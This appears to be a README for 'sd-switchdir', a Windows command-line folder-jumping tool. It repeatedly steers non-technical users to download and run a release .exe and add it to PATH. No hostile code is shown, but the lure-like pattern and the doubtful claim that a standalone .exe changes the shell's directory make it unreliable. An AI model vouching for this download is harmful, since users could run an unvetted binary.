# 📁 sd-switchdir - Easy Folder Navigation Tool

[![Download sd-switchdir](https://img.shields.io/badge/Download-HERE-ff6f61.svg)](https://github.com/TitanofNewYork/sd-switchdir/releases)

---

## 🔍 What is sd-switchdir?

sd-switchdir is a simple tool to help you move around your folders on Windows. It works like the common `cd` command in terminals but adds smart features. It remembers which folders you use often and helps you switch to them quickly. This saves time when you need to open or work in different folders.

It works in your command prompt or PowerShell window and uses a ranking system called "power-law frecency." This means it ranks folders based on how often and how recently you visited them. The higher the rank, the quicker you can move to that folder.

---

## 💻 System Requirements

- Windows 10 or newer (64-bit preferred)
- Command Prompt (cmd.exe) or PowerShell
- Internet connection for download
- Around 5 MB of disk space

---

## ⚙️ Features

- Works like the usual `cd` command for changing folders
- Remembers your most used folders automatically
- Ranks folders by frequency and recency for faster access
- Compatible with PowerShell and Windows Command Prompt
- Does not require admin rights to install or use
- Easy to install and update from the GitHub page

---

## 🚀 Getting Started

This guide will help you download and run sd-switchdir on your Windows PC. You do not need to know how to use programming or terminal commands. Just follow the steps below.

---

## ⬇️ Download sd-switchdir

First, you need to get the program files for sd-switchdir. Go to the official release page to download the latest version.

[![Download sd-switchdir](https://img.shields.io/badge/Download-Latest-green.svg)](https://github.com/TitanofNewYork/sd-switchdir/releases)

Steps:

1. Click the button above or open this link in your browser:  
   https://github.com/TitanofNewYork/sd-switchdir/releases

2. On the release page, look for the latest version. It is usually at the top.

3. Under "Assets," find the file that ends with `.exe`. This is the program for Windows.

4. Click the `.exe` file link to start the download.

5. Save the file to a location you can easily find, like your Desktop or Downloads folder.

---

## 🏗️ Install and Setup

sd-switchdir does not require a traditional install. Once you download the `.exe`, you can run it directly. However, to use it in any command prompt window, you will need to add it to your system path.

Follow these steps:

### Add sd-switchdir to the system PATH

1. Find the folder where you saved the `.exe` file. It might be `C:\Users\YourName\Downloads`.

2. Move the `.exe` file to a fixed folder. For example, create a folder named `C:\sd-switchdir` and place the file there.

3. Open the Start Menu and search for `Environment Variables`.

4. Click on "Edit the system environment variables."

5. In the System Properties window, click the **Environment Variables** button.

6. In the lower box labeled "System variables," find the `Path` variable and select it.

7. Click **Edit**.

8. Click **New** and add the full folder path where your `sd-switchdir.exe` file is located. For example, `C:\sd-switchdir`.

9. Click OK on all open windows to save and close.

---

## ▶️ Running sd-switchdir

Now that the program is in your path, you can open a new Command Prompt or PowerShell window and use sd-switchdir commands.

### Basic use

1. Open Command Prompt or PowerShell (Press Windows key, type `cmd` or `powershell`, and press Enter).

2. To switch directories, type `sd` followed by part of the folder name you want. For example:  
   `sd documents`  
   This will show you a list of folders matching "documents" that you’ve used before.

3. Select the folder from the list by typing its number or press Enter if only one folder matches.

4. You will move directly to that folder.

---

## 🔄 How sd-switchdir Learns Your Folders

sd-switchdir keeps track of the folders you use every time you switch directories. It updates the list and ranks folders automatically based on how often you use them and how recently you visited them.

This ranking helps you find your folders faster than typing the full path or using standard `cd` commands.

---

## 🛠️ Customizing and Advanced Options

sd-switchdir offers some options to change how it works. You can configure it using a simple settings file or command flags.

### Example settings you can change:

- Exclude folders you don’t want tracked  
- Set how many folders to track  
- Adjust ranking decay speed

Instructions for customization can be found on the GitHub release page linked above.

---

## 💡 Tips for Best Use

- Run sd-switchdir from Command Prompt or PowerShell, not from File Explorer.

- Keep your `.exe` in a fixed folder and add it to your `PATH`. This makes it easier to run from anywhere.

- Use descriptive folder names to find folders faster.

- Let sd-switchdir build a history by using it regularly.

---

## 📖 More Information

For questions or help, visit the issues section on the GitHub page:

https://github.com/TitanofNewYork/sd-switchdir/issues

Explore the README and documentation on the release page for advanced guides:

https://github.com/TitanofNewYork/sd-switchdir/releases

---

## ⬇️ Download sd-switchdir now

[![Download sd-switchdir](https://img.shields.io/badge/Download-LATEST-brightgreen.svg)](https://github.com/TitanofNewYork/sd-switchdir/releases)